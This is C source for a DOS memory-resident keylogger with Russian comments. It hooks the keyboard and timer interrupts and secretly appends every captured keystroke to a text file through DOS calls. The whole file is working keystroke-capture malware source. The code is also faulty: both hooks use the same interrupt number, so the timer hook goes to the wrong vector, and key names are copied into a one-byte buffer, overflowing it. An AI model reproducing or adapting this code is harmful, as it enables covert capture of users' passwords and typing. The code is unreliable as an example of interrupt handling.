#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <dos.h>

#define INTR 9
#ifdef __cplusplus
    #define __CPPARGS ...
#else
    #define __CPPARGS
#endif

void interrupt ( *Old_9h)(__CPPARGS);  //Старый обработчиик клавиатуры
void interrupt ( *Old_8h)(__CPPARGS);  //Старый обработчиик таймера
unsigned long int in_dos;

unsigned int Last_Key[256];
unsigned int Curr_Key;
unsigned int Curr_Key_for8;
unsigned int Curr_Key_for9;
unsigned char NotWrited=0;

char filename[] = "test.txt";
unsigned int handle;
char addstr[] = "";
unsigned int len_this;

void addtofile()
{
//************* Работа с DOS функциями *********************
Curr_Key=Curr_Key_for8;

switch (Curr_Key)
   {
   case 0x1000: setvect(INTR, Old_9h);          //Alt-Q выход
		setvect(INTR, Old_8h);
		exit(0);		//Выходит сразу из Nortona. Это удобно.
   case 0x3B00: strcpy(addstr, "F1"); 		break;
   case 0x3C00: strcpy(addstr, "F2");		break;
   case 0x3D00: strcpy(addstr, "F3");		break;
   case 0x3E00: strcpy(addstr, "F4");		break;
   case 0x3F00: strcpy(addstr, "F5");		break;
   case 0x4040: strcpy(addstr, "F6");		break;
   case 0x4100: strcpy(addstr, "F7");		break;
   case 0x4200: strcpy(addstr, "F8");		break;
   case 0x4300: strcpy(addstr, "F9");		break;
   case 0x4400: strcpy(addstr, "F10");		break;
   case 0x4700: strcpy(addstr, "Home");		break;
   case 0x0e08: strcpy(addstr, "BackSpace");	break;
   case 0x0f09: strcpy(addstr, "Tab");		break;
//   case 0x3600: strcpy(addstr, "RightShift");	break;
//   case 0x3800: strcpy(addstr, "Alt");       	break;
//   case 0x1D00: strcpy(addstr, "Ctrl");    	break;
//   case 0x3a00: strcpy(addstr, "CapsLock");	break;
   case 0x1C0D: strcpy(addstr, "Enter"); 	break;
   case 0x3920: strcpy(addstr, "Space");	break;
   case 0x011B: strcpy(addstr, "Esc");	  	break;
   default:
	   if (Curr_Key >= 0x8000 || Curr_Key < 0x0200) { goto NotWriteThis; }
	   if (Curr_Key -((unsigned int)(Curr_Key/256))*256 < 0x20) { goto NotWriteThis; }
	   if (Curr_Key -((unsigned int)(Curr_Key/256))*256 >= 0x80) { goto NotWriteThis; }
	   addstr[0]=Curr_Key-((unsigned int)(Curr_Key/256))*256;
	   addstr[1]=0;
   }

   len_this=strlen(addstr);

/*asm mov AH, 0x51           //Сохраняем старый PSP
asm int 0x21
asm push BX
asm mov AH, 0x50           //Настраиваем PSP на наш сегмент
asm mov BX, CS
asm int 0x21*/

asm mov AH, 0x3D                  //Открываем, записываем и закрываем файл.
asm mov AL, 1
asm mov DX, offset filename
asm int 0x21
asm mov handle, AX

asm mov AH, 0x42
asm mov AL, 2
asm mov BX, handle
asm mov CX, 0
asm mov DX, 0
asm int 0x21

/*asm mov AH, 0x40
asm mov BX, handle
asm mov CX, 1
asm mov DX, offset little
asm int 0x21*/

asm mov AH, 0x40
asm mov BX, handle
asm mov CX, len_this
asm mov DX, offset addstr
asm int 0x21

asm mov AH, 0x3E
asm mov BX, handle
asm int 0x21

/*asm pop BX
asm mov AH, 50
asm int 0x21*/

NotWriteThis:
return;
}

void interrupt New_8h(__CPPARGS)
{
Old_8h();

asm mov AX, 0xB800          //Индикатор работы
asm mov ES, AX
asm mov AX, word ptr DS:NotWrited
asm mov ES:[0x00], AX

if (NotWrited)
   {
   if (peekb((unsigned int)(in_dos/65536), in_dos-((unsigned int)(in_dos/65536))*65536)==0)
      {                             //DOS свободна? Да - пишем.
      Curr_Key_for8=Last_Key[NotWrited];
      addtofile();
      NotWrited--;
      }
   }
}

void interrupt New_9h(__CPPARGS)
{
Old_9h();

asm mov AX, 0xB800          //Индикатор работы
asm mov ES, AX
asm mov AX, word ptr DS:NotWrited
asm mov ES:[0x02], AX

asm mov AX, 0x0040          //Переслать в AX последний символ из буфера
asm mov ES, AX
asm mov BX, ES:0x1A
asm mov AX, ES:[BX]

Curr_Key_for9=_AX;

/*if (peekb(in_dos-((unsigned int)(in_dos/256))*256, (unsigned int)(in_dos/256))==0 && NotWrited=0)
   {                                 //DOS свободна?
   addtofile();
   goto ToHome;
   }*/

NotWrited++;                    //Нет - задание таймеру
if (NotWrited >= 254)              //сброс буфера при переполнении
   {
   NotWrited=1;
   }

for (int i=NotWrited;i>1;i--)
    {
    Last_Key[i]=Last_Key[i-1];
    }
Last_Key[1]=Curr_Key_for9;
//ToHome:
}

int main()
{
/*asm mov AH, 0x3C
asm mov CX, 0
asm mov AL, 0
asm mov DX, word ptr filename
asm int 0x21
asm mov handle, AX

asm mov AH, 0x3E
asm mov BX, handle
asm int 0x21*/

asm mov AH, 0x34                 //Получим адрес флага занятости DOS
asm int 0x21
asm mov word ptr DS:in_dos, BX
asm mov word ptr DS:in_dos+2, ES

Old_8h=getvect(INTR);            //Поменяем 8-ое и 9-ое прерывание на свои
setvect(INTR, New_8h);

Old_9h=getvect(INTR);
setvect(INTR, New_9h);

printf("Вектора 8 и 9 перехвачены.\n");

keep(0, _SS + (_SP/16) - _psp);
return 0;
}

